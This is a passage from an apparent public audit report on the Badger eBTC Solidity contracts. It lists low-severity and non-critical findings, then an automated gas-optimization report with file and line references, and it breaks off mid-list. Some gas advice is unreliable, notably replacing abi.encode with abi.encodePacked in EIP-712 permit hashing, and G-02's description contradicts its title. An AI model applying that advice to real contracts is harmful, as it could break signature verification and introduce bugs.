[alexzoid](https://github.com/code-423n4/2023-10-badger-findings/issues/279), [7ashraf](https://github.com/code-423n4/2023-10-badger-findings/issues/243), [twicek](https://github.com/code-423n4/2023-10-badger-findings/issues/241), [twcctop](https://github.com/code-423n4/2023-10-badger-findings/issues/235), [niroh](https://github.com/code-423n4/2023-10-badger-findings/issues/219), [bdmcbri](https://github.com/code-423n4/2023-10-badger-findings/issues/202), [hihen](https://github.com/code-423n4/2023-10-badger-findings/issues/104), and [fatherOfBlocks](https://github.com/code-423n4/2023-10-badger-findings/issues/15).*

## [L-01] Redundant check
https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L863

`_redistributeDebt` will never be called if debt = 0.

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L525-L527

## [L-02] BaseMath is not used
PriceFeed contract inherits from BaseMath but doesn't use it's single constant DECIMAL\_PRECISION, so it's possible to remove it.

## [L-03] Unused modifier
https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L323

This modifier is not used in `EBTCTokem.sol`.

## [L-04] Enforce beta is not zero
Authorized users can change `beta` value (https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L830), if it's set to zero.

We'll divide by zero here:

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L624

## [L-05] `arrayIndex` value is not deleted when we remove cpd
https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L269-L274

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L471

When we remove cpd, we zero all it's values, but `arrayIndex` remains.

## [L-06] Hash value name inconsistency
https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L33-L35

We use 
```  
      keccak256(
            "PermitPositionManagerApproval(address borrower,address positionManager,uint8 status,uint256 nonce,uint256 deadline)"
        );
```

But in `permitPositionManagerApproval` we use `approval` instead of `status`  
https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L709

## [L-07] Consider using enum values instead of numbers
https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L826

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L831

`status == ICdpManagerData.Status.active`

`status == ICdpManagerData.Status.nonExistent`

## [L-08] It would be more appropriate to use `syncGlobalAccountingAndGracePeriod`
https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1146

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1157

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1168

Here we update global system parameters but we use `syncGlobalAccounting` which doesn't trigger recovery mode if TCR becomes less than CCR, unlike `syncGlobalAccountingAndGracePeriod`.

```
    function syncGlobalAccounting() external {
        _requireCallerIsBorrowerOperations();
        _syncGlobalAccounting();
    }
```
```
    function syncGlobalAccountingAndGracePeriod() public {
        _syncGlobalAccounting(); // Apply // Could trigger RM
        _syncGracePeriod(); // Synch Grace Period
    }
```

## [N-01] Typos, wrong comments and naming
1. These comments are copy-pasted from Auth.sol, we don't check the owner here

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Dependencies/AuthNoOwner.sol#L33-L34

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Dependencies/AuthNoOwner.sol#L39-L40

2. Fee floor is actually 0%

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Dependencies/EbtcBase.sol#L35

3. Entire system debt

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Dependencies/EbtcBase.sol#L73

4. Memorizing typo

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Dependencies/Auth.sol#L33

5. `sending EBTC directly to a Liquity`

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L22

6. \_NICR would be more appropriate name

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L165

CR is associated with collateral ratio, however in this function we use NICR values to find a hint

7. Wrong pair names in comments

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L784

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L786
should be stETH-ETH feed

8. ETH-USD comment from Liquity

https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L594

should be stETH-BTC

**[ronnyx2017 (Judge) commented](https://github.com/code-423n4/2023-10-badger-findings/issues/67#issuecomment-1829519278):**
> There are some other Low/Non-Critical issues downgraded from High/Medium that are also worth noting:

- [Not having a borrowing fee can weaken the peg stability.](https://github.com/code-423n4/2023-10-badger-findings/issues/159)
- [RolesAuthority: Incorrectly removing the function signature from the target.](https://github.com/code-423n4/2023-10-badger-findings/issues/244)
- [`LeverageMacroFactory` is susceptible to chain reorganization events.](https://github.com/code-423n4/2023-10-badger-findings/issues/224)
- [Incorrect calculations in `_chainlinkPriceChangeAboveMax`.](https://github.com/code-423n4/2023-10-badger-findings/issues/73)
- [`FeeRecipient` address is inconsistent through multiple contracts.](https://github.com/code-423n4/2023-10-badger-findings/issues/70)
- [`Governor.getUsersByRole` and `Governor.getRolesForUser` return 255 results at most.](https://github.com/code-423n4/2023-10-badger-findings/issues/185) 
- [`LeverageMacroBase.doOperation` being used by openCdp may cause OOG in some cases.](https://github.com/code-423n4/2023-10-badger-findings/issues/151)
- [Unnecessary restrictions make functions unavailable.](https://github.com/code-423n4/2023-10-badger-findings/issues/112)
- [Inconsistency in the `feeRecipientAddress` variable setting.](https://github.com/code-423n4/2023-10-badger-findings/issues/17) 
- [`fetchPrice` returns a staler price when oracle is frozen.](https://github.com/code-423n4/2023-10-badger-findings/issues/261)
- [`CollSurplusPool`'s `FeeRecipientAddress` is defined as immutable and will be out of sync.](https://github.com/code-423n4/2023-10-badger-findings/issues/150)

***

# Gas Optimizations

For this audit, 24 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-10-badger-findings/issues/280) by **DavidGiladi** received the top score from the judge.

*The following wardens also submitted reports: [hunter\_w3b](https://github.com/code-423n4/2023-10-badger-findings/issues/312), [cheatc0d3](https://github.com/code-423n4/2023-10-badger-findings/issues/305), [zabihullahazadzoi](https://github.com/code-423n4/2023-10-badger-findings/issues/300), [unique](https://github.com/code-423n4/2023-10-badger-findings/issues/295), [JCK](https://github.com/code-423n4/2023-10-badger-findings/issues/263), [Sathish9098](https://github.com/code-423n4/2023-10-badger-findings/issues/242), [Madalad](https://github.com/code-423n4/2023-10-badger-findings/issues/237), [codeslide](https://github.com/code-423n4/2023-10-badger-findings/issues/165), [hihen](https://github.com/code-423n4/2023-10-badger-findings/issues/103), [oualidpro](https://github.com/code-423n4/2023-10-badger-findings/issues/37), [SY\_S](https://github.com/code-423n4/2023-10-badger-findings/issues/322), [nonseodion](https://github.com/code-423n4/2023-10-badger-findings/issues/321), [petrichor](https://github.com/code-423n4/2023-10-badger-findings/issues/317), [sivanesh\_808](https://github.com/code-423n4/2023-10-badger-findings/issues/316), [0xhex](https://github.com/code-423n4/2023-10-badger-findings/issues/314), [tala7985](https://github.com/code-423n4/2023-10-badger-findings/issues/313), [mgf15](https://github.com/code-423n4/2023-10-badger-findings/issues/311), [0xta](https://github.com/code-423n4/2023-10-badger-findings/issues/309), [SAQ](https://github.com/code-423n4/2023-10-badger-findings/issues/299), [jamshed](https://github.com/code-423n4/2023-10-badger-findings/issues/285), [Collinsoden](https://github.com/code-423n4/2023-10-badger-findings/issues/130), [lsaudit](https://github.com/code-423n4/2023-10-badger-findings/issues/96), and [ybansal2403](https://github.com/code-423n4/2023-10-badger-findings/issues/60).*


### Gas Optimization Issues
|Title|Issue|Instances|Total Gas Saved|
|-|:-|:-:|:-:|
|[G-01] Inefficient use of abi.encode() | [Inefficient use of abi.encode()](#inefficient-use-of-abiencode) | 6 | 600 |
|[G-02] Use assembly to emit events | [Use assembly to emit events](#use-assembly-to-emit-events) | 78 | 2964 |
|[G-03] Avoid unnecessary storage updates | [Avoid unnecessary storage updates](#avoid-unnecessary-storage-updates) | 5 | 4000 |
|[G-04] Multiplication and Division by 2 Should use in Bit Shifting | [Multiplication and Division by 2 Should use in Bit Shifting](#multiplication-and-division-by-2-should-use-in-bit-shifting) | 1 | 20 |
|[G-05] Using bools for storage incurs overhead | [Using bools for storage incurs overhead](#using-bools-for-storage-incurs-overhead) | 2 | 34200 |
|[G-06] Optimizing Small Data Storage with Bytes32 | [Optimizing Small Data Storage with Bytes32](#optimizing-small-data-storage-with-bytes32) | 11 | 4158 |
|[G-07] Check Arguments Early | [Check Arguments Early](#check-arguments-early) | 4 | - |
|[G-08] Division operations between unsigned could be unchecked | [Division operations between unsigned could be unchecked](#division-operations-between-unsigned-could-be-unchecked) | 3 | 255 |
|[G-09] Modulus operations that could be unchecked | [Modulus operations that could be unchecked](#modulus-operations-that-could-be-unchecked) | 1 | 85 |
|[G-10] Potential Optimization by Combining Multiple Mappings into a Struct | [Potential Optimization by Combining Multiple Mappings into a Struct](#potential-optimization-by-combining-multiple-mappings-into-a-struct) | 2 | 1000 |
|[G-11] Constants Variable Should Be Private for Gas Optimization | [Constants Variable Should Be Private for Gas Optimization](#constants-variable-should-be-private-for-gas-optimization) | 18 | 61200 |
|[G-12] State variables that could be declared constant | [State variables that could be declared constant](#state-variables-that-could-be-declared-constant) | 10 | 20970 |
|[G-13] Use of emit inside a loop | [Use of emit inside a loop](#use-of-emit-inside-a-loop) | 5 | 5130 |
|[G-14] Empty Block | [Empty Block](#empty-block) | 2 | - |
|[G-15] Identical Deployments Should be Replaced with Clone | [Identical Deployments Should be Replaced with Clone](#identical-deployments-should-be-replaced-with-clone) | 1 | - |
|[G-16] Use a More Recent Version of Solidity | [Use a More Recent Version of Solidity](#use-a-more-recent-version-of-solidity) | 34 | - |
|[G-17] Inefficient assignments to state variables | [Inefficient assignments to state variables](#inefficient-assignments-to-state-variables) | 1 | 113 |
|[G-18] Greater or Equal Comparison Costs Less Gas than Greater Comparison | [Greater or Equal Comparison Costs Less Gas than Greater Comparison](#greater-or-equal-comparison-costs-less-gas-than-greater-comparison) | 9 | 27 |
|[G-19] Inefficient Parameter Storage | [Inefficient Parameter Storage](#inefficient-parameter-storage) | 35 | 1750 |
|[G-20] Using Storage Instead of Memory for structs/arrays Saves Gas | [Using Storage Instead of Memory for structs/arrays Saves Gas](#using-storage-instead-of-memory-for-structsarrays-saves-gas) | 7 | 29400 |
|[G-21] Internal or Private Function that Called Once Should Be Inlined to Save Gas | [Internal or Private Function that Called Once Should Be Inlined to Save Gas](#internal-or-private-function-that-called-once-should-be-inlined-to-save-gas) | 19 | 380 |
|[G-22] Inefficient Gas Usage in Solidity Smart Contracts Due to Long Error Messages | [Inefficient Gas Usage in Solidity Smart Contracts Due to Long Error Messages](#inefficient-gas-usage-in-solidity-smart-contracts-due-to-long-error-messages) | 111 | 1998 |
|[G-23] Consider Merge Sequential For-Loops | [Consider Merge Sequential For-Loops](#consider-merge-sequential-for-loops) | 1 | - |
|[G-24] Declare Constructor Function as Payable to Save Gas | [Declare Constructor Function as Payable to Save Gas](#declare-constructor-function-as-payable-to-save-gas) | 16 | 336 |
|[G-25] Optimize address(0) Checks Using Assembly | [Optimize address(0) Checks Using Assembly](#optimize-address0-checks-using-assembly) | 6 | 348 |
|[G-26] Optimize Names to Save Gas | [Optimize Names to Save Gas](#optimize-names-to-save-gas) | 8 | 176 |
|[G-27] Optimal State Variable Order | [Optimal State Variable Order](#optimal-state-variable-order) | 3 | 15000 |
|[G-28] Optimal Struct Variable Order | [Optimal Struct Variable Order](#optimal-struct-variable-order) | 4 | 20000 |
|[G-29] Postfix operations that could be replaced with prefix operations | [Postfix operations that could be replaced with prefix operations](#Postfix-operations-that-could-be-replaced-with-prefix-operations) | 12 | 60 |
|[G-30] Redundant Bool Comparison | [Redundant Bool Comparison](#redundant-bool-comparison) | 1 | 9 |
|[G-31] Redundant state variable getters | [Redundant state variable getters](#redundant-state-variable-getters) | 2 | - |
|[G-32] Consider activating via-ir for deploying | [Consider activating via-ir for deploying](#consider-activating-via-ir-for-deploying) | 1 | - |
|[G-33] Short-circuit rules can be used to optimize some gas usage | [Short-circuit rules can be used to optimize some gas usage](#short-circuit-rules-can-be-used-to-optimize-some-gas-usage) | 7 | 14700 |
|[G-34] Use Small Integer For Efficiency | [Use Small Integer For Efficiency](#use-small-integer-for-efficiency) | 5 | 30 |
|[G-35] Splitting Require Assert Statements | [Splitting Require Assert Statements](#splitting-require-assert-statements) | 8 | 24 |
|[G-36] State variable access within a loop | [State variable access within a loop](#state-variable-access-within-a-loop) | 33 | 8745 |
|[G-37] Superfluous event fields | [Superfluous event fields](#superfluous-event-fields) | 1 | - |
|[G-38] Cache Array Length Outside of Loop | [Cache Array Length Outside of Loop](#cache-array-length-outside-of-loop) | 3 | 9 |
|[G-39] State variables should be cached in stack variables rather than re-reading them from storage | [State variables should be cached in stack variables rather than re-reading them from storage](#state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage) | 29 | 2813 |
|[G-40] Safe Subtraction Should Be Unchecked | [Safe Subtraction Should Be Unchecked](#safe-subtraction-should-be-unchecked) | 11 | 935 |
|[G-41] Detection of Unnecessary Checked Increments in Solidity Loop Statements | [Detection of Unnecessary Checked Increments in Solidity Loop Statements](#detection-of-unnecessary-checked-increments-in-solidity-loop-statements) | 10 | 600 |
|[G-42] Avoid Unnecessary Computation Inside Loops | [Avoid Unnecessary Computation Inside Loops](#avoid-unnecessary-computation-inside-loops) | 3 | - |
|[G-43] Redundant Contract Existence Check in Consecutive External Calls | [Redundant Contract Existence Check in Consecutive External Calls](#redundant-contract-existence-check-in-consecutive-external-calls) | 8 | 800 |
|[G-44] Initialize Variables With Default Value | [Initialize Variables With Default Value](#initialize-variables-with-default-value) | 17 | 102 |
|[G-45] Unused Named Return Variables | [Unused Named Return Variables](#unused-named-return-variables) | 4 | - |
|[G-46] Use assembly to write address storage values | [Use assembly to write address storage values](#use-assembly-to-write-address-storage-values) | 24 | 1848 |
|[G-47] Use Assembly for Hash Calculation | [Use Assembly for Hash Calculation](#use-assembly-for-hash-calculation) | 12 | 960 |
|[G-48] Usage of Custom Errors for Gas Efficiency | [Usage of Custom Errors for Gas Efficiency](#usage-of-custom-errors-for-gas-efficiency) | 152 | 41952 |

Total: 746 instances over 48 issues

## [G-01] Inefficient use of abi.encode()
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 600

### Description
The `abi.encode()` function is less gas efficient than `abi.encodePacked()`, especially when encoding only static types. This detector identifies instances where `abi.encode()` is used and all arguments are static, suggesting that `abi.encodePacked()` could potentially be used instead for better gas efficiency. Note: `abi.encodePacked()` should not be used if any of the arguments are dynamic types, as it could lead to hash collisions.

<details>

<summary>
There are 6 instances of this issue:

</summary>

###
#

```
File: contracts/BorrowerOperations.sol

682    return keccak256(abi.encode(typeHash, name, version, _chainID(), address(this)))
```
 use  abi.encodepacked() instead.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L682](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L682)


#

```
File: contracts/BorrowerOperations.sol

717    bytes32 digest = keccak256(
718                abi.encodePacked(
719                    "\x19\x01",
720                    domainSeparator(),
721                    keccak256(
722                        abi.encode(
723                            _PERMIT_POSITION_MANAGER_TYPEHASH,
724                            _borrower,
725                            _positionManager,
726                            _approval,
727                            _nonces[_borrower]++,
728                            _deadline
729                        )
730                    )
731                )
732            )
```
 use  abi.encodepacked() instead.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L717-L732](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L717-L732)


#

```
File: contracts/EBTCToken.sol

209    bytes32 digest = keccak256(
210                abi.encodePacked(
211                    "\x19\x01",
212                    domainSeparator(),
213                    keccak256(
214                        abi.encode(_PERMIT_TYPEHASH, owner, spender, amount, _nonces[owner]++, deadline)
215                    )
216                )
217            )
```
 use  abi.encodepacked() instead.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L209-L217](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L209-L217)


#

```
File: contracts/EBTCToken.sol

240    return keccak256(abi.encode(typeHash, name, version, _chainID(), address(this)))
```
 use  abi.encodepacked() instead.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L240](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L240)


#

```
File: contracts/LeverageMacroBase.sol

148    IERC3156FlashLender(address(borrowerOperations)).flashLoan(
149                    IERC3156FlashBorrower(address(this)),
150                    address(ebtcToken),
151                    borrowAmount,
152                    abi.encode(operation)
153                )
```
 use  abi.encodepacked() instead.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L148-L153](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L148-L153)


#

```
File: contracts/LeverageMacroBase.sol

155    IERC3156FlashLender(address(activePool)).flashLoan(
156                    IERC3156FlashBorrower(address(this)),
157                    address(stETH),
158                    borrowAmount,
159                    abi.encode(operation)
160                )
```
 use  abi.encodepacked() instead.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L155-L160](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L155-L160)


</details>

# 


## [G-02] Use assembly to emit events
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 2964

### Description
This detector checks for instances where a contract uses assembly code to emit events. While it's technically possible to emit events using inline assembly in Solidity, it's generally discouraged due to readability concerns and potential for errors. Events should usually be emitted using higher-level Solidity constructs.

<details>

<summary>
There are 78 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

65    emit FeeRecipientAddressChanged(_feeRecipientAddress)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L65](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L65)


#

```
File: contracts/ActivePool.sol

112    emit SystemCollSharesUpdated(cachedSystemCollShares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L112](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L112)


#

```
File: contracts/ActivePool.sol

113    emit CollSharesTransferred(_account, _shares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L113](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L113)


#

```
File: contracts/ActivePool.sol

145    emit SystemCollSharesUpdated(cachedSystemCollShares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L145](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L145)


#

```
File: contracts/ActivePool.sol

146    emit CollSharesTransferred(_account, totalShares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L146](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L146)


#

```
File: contracts/ActivePool.sol

173    emit SystemCollSharesUpdated(cachedSystemCollShares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L173](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L173)


#

```
File: contracts/ActivePool.sol

174    emit FeeRecipientClaimableCollSharesIncreased(cachedFeeRecipientCollShares, _shares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L174](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L174)


#

```
File: contracts/ActivePool.sol

200    emit ActivePoolEBTCDebtUpdated(cachedSystemDebt)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L200](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L200)


#

```
File: contracts/ActivePool.sol

213    emit ActivePoolEBTCDebtUpdated(cachedSystemDebt)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L213](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L213)


#

```
File: contracts/ActivePool.sol

247    emit SystemCollSharesUpdated(cachedSystemCollShares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L247](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L247)


#

```
File: contracts/ActivePool.sol

307    emit FlashLoanSuccess(address(receiver), token, amount, fee)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L307](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L307)


#

```
File: contracts/ActivePool.sol

360    emit FeeRecipientClaimableCollSharesDecreased(cachedFeeRecipientCollShares, _shares)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L360](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L360)


#

```
File: contracts/ActivePool.sol

383    emit SweepTokenSuccess(token, amount, cachedFeeRecipientAddress)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L383](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L383)


#

```
File: contracts/ActivePool.sol

399    emit FeeRecipientAddressChanged(_feeRecipientAddress)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L399](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L399)


#

```
File: contracts/ActivePool.sol

412    emit FlashFeeSet(msg.sender, _oldFee, _newFee)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L412](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L412)


#

```
File: contracts/ActivePool.sol

421    emit FlashLoansPaused(msg.sender, _paused)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L421](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L421)


#

```
File: contracts/BorrowerOperations.sol

136    emit FeeRecipientAddressChanged(_feeRecipientAddress)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L136](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L136)


#

```
File: contracts/BorrowerOperations.sol

641    emit PositionManagerApprovalSet(_borrower, _positionManager, _approval)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L641](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L641)


#

```
File: contracts/BorrowerOperations.sol

1105    emit FlashLoanSuccess(address(receiver), token, amount, fee)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1105](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1105)


#

```
File: contracts/BorrowerOperations.sol

1149    emit FeeRecipientAddressChanged(_feeRecipientAddress)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1149](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1149)


#

```
File: contracts/BorrowerOperations.sol

1162    emit FlashFeeSet(msg.sender, _oldFee, _newFee)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1162](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1162)


#

```
File: contracts/BorrowerOperations.sol

1171    emit FlashLoansPaused(msg.sender, _paused)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1171](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1171)


#

```
File: contracts/CdpManager.sol

55    emit StakingRewardSplitSet(stakingRewardSplit)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L55](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L55)


#

```
File: contracts/CdpManagerStorage.sol

542    emit StEthIndexUpdated(_oldIndex, _newIndex, block.timestamp)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L542](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L542)


#

```
File: contracts/CdpManager.sol

220    emit CdpUpdated(
221                    _redeemColFromCdp.cdpId,
222                    ISortedCdps(sortedCdps).getOwnerAddress(_redeemColFromCdp.cdpId),
223                    msg.sender,
224                    _oldDebtAndColl.debt,
225                    _oldDebtAndColl.collShares,
226                    newDebt,
227                    newColl,
228                    Cdps[_redeemColFromCdp.cdpId].stake,
229                    CdpOperation.redeemCollateral
230                )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L220-L230](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L220-L230)


#

```
File: contracts/CdpManager.sol

179    emit CdpUpdated(
180                        _redeemColFromCdp.cdpId,
181                        _borrower,
182                        msg.sender,
183                        _oldDebtAndColl.debt,
184                        _oldDebtAndColl.collShares,
185                        0,
186                        0,
187                        0,
188                        CdpOperation.redeemCollateral
189                    )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L179-L189](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L179-L189)


#

```
File: contracts/CdpManagerStorage.sol

481    emit CdpArrayIndexUpdated(idToMove, index)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L481](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L481)


#

```
File: contracts/CdpManagerStorage.sol

414    emit TotalStakesUpdated(_newTotalStakes)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L414](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L414)


#

```
File: contracts/CdpManagerStorage.sol

425    emit TotalStakesUpdated(_newTotalStakes)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L425](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L425)


#

```
File: contracts/CdpManager.sol

630    emit BaseRateUpdated(newBaseRate)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L630](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L630)


#

```
File: contracts/CdpManager.sol

698    emit LastRedemptionTimestampUpdated(block.timestamp)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L698](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L698)


#

```
File: contracts/CdpManagerStorage.sol

50    emit TCRNotified(_tcr)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L50](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L50)


#

```
File: contracts/CdpManagerStorage.sol

55    emit GracePeriodStart()
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L55](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L55)


#

```
File: contracts/CdpManagerStorage.sol

64    emit TCRNotified(_tcr)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L64](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L64)


#

```
File: contracts/CdpManagerStorage.sol

69    emit GracePeriodEnd()
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L69](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L69)


#

```
File: contracts/CdpManagerStorage.sol

587    emit CollateralFeePerUnitUpdated(_oldPerUnit, _newPerUnit, _feeTaken)
```

